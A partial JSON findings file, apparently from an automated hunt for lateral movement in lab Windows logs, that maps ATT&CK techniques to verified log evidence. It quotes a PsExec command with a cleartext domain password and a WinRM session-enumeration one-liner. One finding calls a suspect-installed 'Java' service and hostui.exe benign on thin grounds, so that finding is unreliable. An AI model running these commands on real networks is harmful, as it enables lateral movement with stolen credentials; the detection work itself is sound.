@@ -1,0 +1,3314 @@
+{
+  "findings": [
+    {
+      "technique": "T1021.002",
+      "title": "PsExec over SMB ADMIN$ from SCRANTON to NASHUA with cleartext credentials, repeated 4x",
+      "assessment": "malicious",
+      "confidence": "high",
+      "summary": "On 2020-05-02 between 03:11:18 and 03:14:42 UTC, user DMEVALS\\pbeesly on scranton.dmevals.local (10.0.1.4) launched C:\\Program Files\\SysinternalsSuite\\PsExec64.exe from a PowerShell parent four times, each time targeting \\\\NASHUA with the password supplied on the command line (-u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe). On nashua.dmevals.local the PSEXESVC service was installed four times (7045) and 4648 explicit-credential logons were recorded with process C:\\Windows\\PSEXESVC.exe, and ADMIN$ (\\\\*\\ADMIN$, Share Path \\??\\C:\\windows) was accessed from source 10.0.1.4 by pbeesly. This is classic SMB/admin-share lateral movement with remote service creation and execution of a payload from C:\\Windows\\Temp.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "process.command_line",
+          "value": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-dad3c51741"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "process.parent.executable",
+          "value": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "query_id": "q-dad3c51741"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qrRFHq",
+          "field": "process.command_line",
+          "value": ".\\PsExec64.exe -accepteula \\\\NASHUA -u \"dmevals\\pbeesly\" -p \"Fl0nk3rt0n!T0by\" -i 2 \"C:\\Windows\\Temp\\python.exe\"",
+          "query_id": "q-d834c4cc01"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuCk",
+          "field": "win.ServiceName",
+          "value": "PSEXESVC",
+          "query_id": "q-9276a6f139"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNvI",
+          "field": "win.ShareName",
+          "value": "\\\\*\\ADMIN$",
+          "query_id": "q-4e3249cc6c"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNur",
+          "field": "process.executable",
+          "value": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-ac9203fe22"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "process.command_line",
+          "claimed": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-dad3c51741",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-839fccd30f",
+            "q-dad3c51741",
+            "q-eedf0bc97a",
+            "q-da306f3cd9",
+            "q-9858c70456"
+          ],
+          "actual": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "timestamp": "2020-05-02T03:11:18.784Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "process.parent.executable",
+          "claimed": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "query_id": "q-dad3c51741",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-839fccd30f",
+            "q-dad3c51741",
+            "q-eedf0bc97a",
+            "q-da306f3cd9",
+            "q-9858c70456"
+          ],
+          "actual": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "timestamp": "2020-05-02T03:11:18.784Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qrRFHq",
+          "field": "process.command_line",
+          "claimed": ".\\PsExec64.exe -accepteula \\\\NASHUA -u \"dmevals\\pbeesly\" -p \"Fl0nk3rt0n!T0by\" -i 2 \"C:\\Windows\\Temp\\python.exe\"",
+          "query_id": "q-d834c4cc01",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-d834c4cc01",
+            "q-595cc78b28"
+          ],
+          "actual": ".\\PsExec64.exe -accepteula \\\\NASHUA -u \"dmevals\\pbeesly\" -p \"Fl0nk3rt0n!T0by\" -i 2 \"C:\\Windows\\Temp\\python.exe\"",
+          "timestamp": "2020-05-01T23:11:18.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.powershell"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuCk",
+          "field": "win.ServiceName",
+          "claimed": "PSEXESVC",
+          "query_id": "q-9276a6f139",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-9276a6f139",
+            "q-79877b0035",
+            "q-a392280f3a",
+            "q-938cf68f34",
+            "q-fe4a0971ab"
+          ],
+          "actual": "PSEXESVC",
+          "timestamp": "2020-05-01T23:11:39.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.other"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNvI",
+          "field": "win.ShareName",
+          "claimed": "\\\\*\\ADMIN$",
+          "query_id": "q-4e3249cc6c",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4e3249cc6c",
+            "q-0de476cc2b",
+            "q-40a69af749"
+          ],
+          "actual": "\\\\*\\ADMIN$",
+          "timestamp": "2020-05-01T23:11:18.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNur",
+          "field": "process.executable",
+          "claimed": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-ac9203fe22",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ac9203fe22",
+            "q-6cbeef0102",
+            "q-2d13c1540d",
+            "q-ae8cd475a2",
+            "q-14a9d1c2b2"
+          ],
+          "actual": "C:\\Windows\\PSEXESVC.exe",
+          "timestamp": "2020-05-01T23:11:40.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.security"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 6
+    },
+    {
+      "technique": "T1021.006",
+      "title": "PowerShell remoting (WinRM) from SCRANTON to NASHUA to enumerate sessions",
+      "assessment": "malicious",
+      "confidence": "medium",
+      "summary": "At 2020-05-01T23:09:23 (03:09:23 UTC) on scranton.dmevals.local, pbeesly ran Invoke-Command -ComputerName NASHUA to enumerate processes/sessions of the same user on the remote host. Sysmon recorded the matching outbound TCP connections from powershell.exe (PID 3852, 10.0.1.4) to 10.0.1.6 on port 5985 at 03:09:23-03:09:29, with the reciprocal inbound connections logged on nashua.dmevals.local. This WinRM reconnaissance immediately preceded the PsExec lateral movement to the same target.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qrRbzS",
+          "field": "process.command_line",
+          "value": "Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId",
+          "query_id": "q-d834c4cc01"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbN",
+          "field": "destination.ip",
+          "value": "10.0.1.6",
+          "query_id": "q-a95c00adfc"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbP",
+          "field": "host.name",
+          "value": "nashua.dmevals.local",
+          "query_id": "q-a95c00adfc"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qrRbzS",
+          "field": "process.command_line",
+          "claimed": "Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId",
+          "query_id": "q-d834c4cc01",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ecb946390c",
+            "q-c1952cb2f9",
+            "q-52fdab0caf",
+            "q-d96d898469",
+            "q-e5c4fd8202"
+          ],
+          "actual": "Invoke-Command -ComputerName NASHUA -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId",
+          "timestamp": "2020-05-01T23:09:23.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.powershell"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbN",
+          "field": "destination.ip",
+          "claimed": "10.0.1.6",
+          "query_id": "q-a95c00adfc",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ae21c33f08",
+            "q-809481db0a",
+            "q-a95c00adfc",
+            "q-c6c158acd1",
+            "q-4902e7de68"
+          ],
+          "actual": "10.0.1.6",
+          "timestamp": "2020-05-02T03:09:23.801Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbP",
+          "field": "host.name",
+          "claimed": "nashua.dmevals.local",
+          "query_id": "q-a95c00adfc",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ae21c33f08",
+            "q-809481db0a",
+            "q-a95c00adfc",
+            "q-ab785dfec7"
+          ],
+          "actual": "nashua.dmevals.local",
+          "timestamp": "2020-05-02T03:09:23.881Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 3
+    },
+    {
+      "technique": "T1021.001",
+      "title": "RDP logon (LogonType 10) as pbeesly on SCRANTON from 172.18.39.2",
+      "assessment": "suspicious",
+      "confidence": "low",
+      "summary": "Two 4624 LogonType 10 events for pbeesly were recorded on scranton.dmevals.local at 2020-05-01T23:20:46 (03:20:46 UTC) from source address 172.18.39.2, Workstation Name SCRANTON, Logon Process User32, Authentication Package Negotiate, with a linked logon ID. The same 172.18.39.2 address also appears in a 4648 explicit-credential event on SCRANTON. No mstsc.exe execution, no 4778/4779 session events and no outbound 3389 connections from a workstation were found, so this looks like an interactive/RDP session into the compromised host rather than host-to-host RDP pivoting; it is not corroborated as lateral movement.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nKg4v2",
+          "field": "win.LogonType",
+          "value": "10",
+          "query_id": "q-e010f19792"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nKg4v2",
+          "field": "win.IpAddress",
+          "value": "172.18.39.2",
+          "query_id": "q-e010f19792"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nKg4v2",
+          "field": "win.WorkstationName",
+          "value": "SCRANTON",
+          "query_id": "q-e010f19792"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nKg4v2",
+          "field": "win.LogonType",
+          "claimed": "10",
+          "query_id": "q-e010f19792",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-deff16df7d",
+            "q-e010f19792",
+            "q-952eb3e252",
+            "q-fd172b755a",
+            "q-10e7d540a0"
+          ],
+          "actual": "10",
+          "timestamp": "2020-05-01T23:20:46.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nKg4v2",
+          "field": "win.IpAddress",
+          "claimed": "172.18.39.2",
+          "query_id": "q-e010f19792",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-deff16df7d",
+            "q-e010f19792",
+            "q-952eb3e252",
+            "q-fd172b755a",
+            "q-10e7d540a0"
+          ],
+          "actual": "172.18.39.2",
+          "timestamp": "2020-05-01T23:20:46.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7nKg4v2",
+          "field": "win.WorkstationName",
+          "claimed": "SCRANTON",
+          "query_id": "q-e010f19792",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-deff16df7d",
+            "q-e010f19792",
+            "q-952eb3e252",
+            "q-fd172b755a",
+            "q-10e7d540a0"
+          ],
+          "actual": "SCRANTON",
+          "timestamp": "2020-05-01T23:20:46.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 3
+    },
+    {
+      "technique": "T1021.003",
+      "title": "No DCOM lateral movement observed",
+      "assessment": "benign",
+      "confidence": "medium",
+      "summary": "No DCOM lateral-movement artifacts were found: no 4624 LogonType 3 with svchost process name, no MMC20.Application/ShellWindows/ShellBrowserWindow script blocks, and no DCOM-related service or process creation. The only Invoke-CimMethod reference is a benign alias definition (Set-Alias -Name icim -Value Invoke-CimMethod) in profile scripts on newyork and scranton.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qwTlue",
+          "field": "process.command_line",
+          "value": "Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
+          "query_id": "q-ecb946390c"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7qwTlue",
+          "field": "process.command_line",
+          "claimed": "Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
+          "query_id": "q-ecb946390c",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ecb946390c",
+            "q-c537c6f3c7"
+          ],
+          "actual": "Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue",
+          "timestamp": "2020-05-01T23:01:35.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.powershell"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 1
+    },
+    {
+      "technique": "T1021.004",
+      "title": "No SSH lateral movement observed",
+      "assessment": "benign",
+      "confidence": "high",
+      "summary": "No outbound connections to port 22 in sysmon or zeek, no sshd/SSH service installation, and no ssh/plink/New-PSSession -HostName script blocks were found in either time window.",
+      "evidence": [
+        {
+          "index": ".ds-logs-zeek-default-2026.10.20-000001",
+          "id": "AaFZSPJfH5wFd7o_aFZ1",
+          "field": "destination.port",
+          "value": "445",
+          "query_id": "q-ab82db0de1"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-zeek-default-2026.10.20-000001",
+          "id": "AaFZSPJfH5wFd7o_aFZ1",
+          "field": "destination.port",
+          "claimed": "445",
+          "query_id": "q-ab82db0de1",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ab82db0de1",
+            "q-25037c752b"
+          ],
+          "actual": 445,
+          "timestamp": "2020-04-30T00:06:38.903Z",
+          "host": "simplerockbuild.simplerock.lan",
+          "dataset": "zeek"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 1
+    },
+    {
+      "technique": "T1021.005",
+      "title": "No VNC lateral movement observed",
+      "assessment": "benign",
+      "confidence": "high",
+      "summary": "No connections to port 5900, no vnc/tvnserver binaries or services, and no VNC-related PowerShell script blocks were found in any dataset.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbN",
+          "field": "destination.port",
+          "value": "5985",
+          "query_id": "q-a95c00adfc"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c-4MbN",
+          "field": "destination.port",
+          "claimed": "5985",
+          "query_id": "q-a95c00adfc",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-ae21c33f08",
+            "q-809481db0a",
+            "q-a95c00adfc",
+            "q-c6c158acd1",
+            "q-4902e7de68"
+          ],
+          "actual": 5985,
+          "timestamp": "2020-05-02T03:09:23.801Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 1
+    },
+    {
+      "technique": "T1072",
+      "title": "PsExec used from scranton to deploy and run C:\\Windows\\Temp\\python.exe on nashua (lateral movement)",
+      "assessment": "malicious",
+      "confidence": "high",
+      "summary": "On 2020-05-02 between 03:11:18 and 03:15:03 UTC, user pbeesly on scranton.dmevals.local repeatedly launched C:\\Program Files\\SysinternalsSuite\\PsExec64.exe from powershell.exe with the command line \"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe (four executions: 03:11:18, 03:12:25, 03:13:28, 03:14:42). Each execution caused the PSEXESVC service to be installed on nashua.dmevals.local (event 7045, Service File Name %SystemRoot%\\PSEXESVC.exe, LocalSystem, demand start) and PSEXESVC.exe to start under services.exe, which then spawned C:\\Windows\\Temp\\python.exe as pbeesly (03:11:40, 03:12:46, 03:13:49, 03:15:03). The python.exe process wrote a BAM UserSettings registry value for its own path, confirming execution. This is abuse of a software-deployment/remote-execution tool to move laterally from a compromised host (scranton, where sdelete64.exe was used to wipe C:\\programdata\\victim\\???cod.3aka3.scr and other files) to nashua, with credentials passed in cleartext on the command line. No SCCM/Intune/SMS deployment-agent activity was observed (C059 zero hits); the deployment-tool artifact here is PsExec.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "process.command_line",
+          "value": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-10e292fc55"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82Oiy",
+          "field": "process.executable",
+          "value": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-10e292fc55"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82OhP",
+          "field": "process.parent.executable",
+          "value": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-10e292fc55"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82OhP",
+          "field": "process.executable",
+          "value": "C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-10e292fc55"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuCk",
+          "field": "message",
+          "value": "Service Name:  PSEXESVC\r\nService File Name:  %SystemRoot%\\PSEXESVC.exe",
+          "query_id": "q-79877b0035"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNv3",
+          "field": "process.command_line",
+          "value": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-8d3838fe54"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7h03AJQ",
+          "field": "registry.path",
+          "value": "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-1830255721-3727074217-2423397540-1107\\\\Device\\HarddiskVolume2\\Windows\\Temp\\python.exe",
+          "query_id": "q-5aa2e0cdfa"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxoQzx",
+          "field": "process.command_line",
+          "claimed": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-10e292fc55",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-839fccd30f",
+            "q-dad3c51741",
+            "q-eedf0bc97a",
+            "q-da306f3cd9",
+            "q-9858c70456"
+          ],
+          "actual": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "timestamp": "2020-05-02T03:11:18.784Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82Oiy",
+          "field": "process.executable",
+          "claimed": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-10e292fc55",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-10e292fc55",
+            "q-4376915466",
+            "q-ebede971ad",
+            "q-cd1a654ba3",
+            "q-4edda752cc"
+          ],
+          "actual": "C:\\Windows\\PSEXESVC.exe",
+          "timestamp": "2020-05-02T03:11:39.934Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82OhP",
+          "field": "process.parent.executable",
+          "claimed": "C:\\Windows\\PSEXESVC.exe",
+          "query_id": "q-10e292fc55",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-10e292fc55",
+            "q-6c06613c3e",
+            "q-a559b1e79c",
+            "q-cf1e6614b3",
+            "q-762b97d6aa"
+          ],
+          "actual": "C:\\Windows\\PSEXESVC.exe",
+          "timestamp": "2020-05-02T03:11:40.213Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7c82OhP",
+          "field": "process.executable",
+          "claimed": "C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-10e292fc55",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-10e292fc55",
+            "q-6c06613c3e",
+            "q-a559b1e79c",
+            "q-cf1e6614b3",
+            "q-762b97d6aa"
+          ],
+          "actual": "C:\\Windows\\Temp\\python.exe",
+          "timestamp": "2020-05-02T03:11:40.213Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuCk",
+          "field": "message",
+          "claimed": "Service Name:  PSEXESVC\r\nService File Name:  %SystemRoot%\\PSEXESVC.exe",
+          "query_id": "q-79877b0035",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-9276a6f139",
+            "q-79877b0035",
+            "q-a392280f3a",
+            "q-938cf68f34",
+            "q-fe4a0971ab"
+          ],
+          "actual": "A service was installed in the system.\r\n\r\nService Name:  PSEXESVC\r\nService File Name:  %SystemRoot%\\PSEXESVC.exe\r\nService Type:  user mode service\r\nService Start Type:  demand start\r\nService Account:  LocalSystem",
+          "timestamp": "2020-05-01T23:11:39.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.other"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7niyNv3",
+          "field": "process.command_line",
+          "claimed": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "query_id": "q-8d3838fe54",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-8d3838fe54",
+            "q-391329c7a2",
+            "q-f31bc56ccf"
+          ],
+          "actual": "\"C:\\Program Files\\SysinternalsSuite\\PsExec64.exe\" -accepteula \\\\NASHUA -u dmevals\\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\\Windows\\Temp\\python.exe",
+          "timestamp": "2020-05-01T23:11:18.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7h03AJQ",
+          "field": "registry.path",
+          "claimed": "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-1830255721-3727074217-2423397540-1107\\\\Device\\HarddiskVolume2\\Windows\\Temp\\python.exe",
+          "query_id": "q-5aa2e0cdfa",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-6c06613c3e",
+            "q-5aa2e0cdfa",
+            "q-a97afb6470"
+          ],
+          "actual": "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-1830255721-3727074217-2423397540-1107\\\\Device\\HarddiskVolume2\\Windows\\Temp\\python.exe",
+          "timestamp": "2020-05-02T03:11:40.605Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 7
+    },
+    {
+      "technique": "T1072",
+      "title": "Azure guest-agent, logman and javamtsup service activity on scranton is benign platform behaviour",
+      "assessment": "benign",
+      "confidence": "high",
+      "summary": "The remaining deployment-tool-like hits are normal Windows/Azure platform activity, not adversary deployment. On scranton.dmevals.local, logman.exe was invoked by C:\\WindowsAzure\\Packages\\WaAppAgent.exe to stop/create/start the GAEvents and RTEvents ETW traces (03:18:38-03:19:44), and the javamtsup.exe service (installed 2020-05-01 23:04:15 by pbeesly as 'Java(TM) Virtual Machine Support Service') started under services.exe at 03:19:14 and spawned rundll32.exe. hostui.exe was started by powershell.exe at 03:21:27. These are consistent with the Azure guest agent and OS service lifecycle; no SCCM/Intune/SMS deployment agent was found (C059 returned zero hits), and the only genuine deployment-tool abuse in this window is the PsExec activity reported separately.",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cfUP4A",
+          "field": "process.command_line",
+          "value": "\"logman.exe\" create trace RTEvents -max 50 -f bincirc -o C:\\WindowsAzure\\Logs\\RuntimeEvents.etl -pf C:\\WindowsAzure\\Packages\\GuestAgent\\ProviderGuids.txt",
+          "query_id": "q-849c3b3ee9"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cxpAy5",
+          "field": "process.executable",
+          "value": "C:\\Windows\\System32\\javamtsup.exe",
+          "query_id": "q-849c3b3ee9"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.20-000001",
+          "id": "AaFZR_JfH5wFd7pNHuDg",
+          "field": "message",
+          "value": "Service Name:  Java(TM) Virtual Machine Support Service\r\nService File Name:  C:\\Windows\\System32\\javamtsup.exe",
+          "query_id": "q-79877b0035"
+        }
+      ],
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.20-000001",
+          "id": "AaFZRvJfH5wFd7cfUP4A",
+          "field": "process.command_line",
+          "claimed": "\"logman.exe\" create trace RTEvents -max 50 -f bincirc -o C:\\WindowsAzure\\Logs\\RuntimeEvents.etl -pf C:\\WindowsAzure\\Packages\\GuestAgent\\ProviderGuids.txt",
+          "query_id": "q-849c3b3ee9",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-849c3b3ee9",
+            "q-0562923eec"
+          ],
+          "actual": "\"logman.exe\" create trace RTEvents -max 50 -f bincirc -o C:\\WindowsAzure\\Logs\\RuntimeEvents.etl -pf C:\\WindowsAzure\\Packages\\GuestAgent\\ProviderGuids.txt",
+          "timestamp": "2020-05-02T03:19:41.076Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
